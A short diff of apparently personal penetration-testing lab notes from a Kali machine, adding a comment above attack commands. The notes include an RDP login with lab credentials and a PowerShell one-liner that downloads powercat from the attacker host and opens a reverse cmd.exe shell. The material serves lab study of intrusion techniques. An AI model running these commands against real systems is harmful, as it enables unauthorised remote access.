@@ -10,6 +10,7 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
 xfreerdp into the VM#1
 xfreerdp /u:'offsec' /p:'lab' /v:192.168.244.194:3389 /size:95% /cert:ignore +clipboard /drive:smbfolder,/home/kali/Desktop/Windows
 
+#kali command prompt
 LHOST=192.168.45.185
 LPORT=8443
 pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('http://$LHOST:88/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > revshell-pwsh.txt
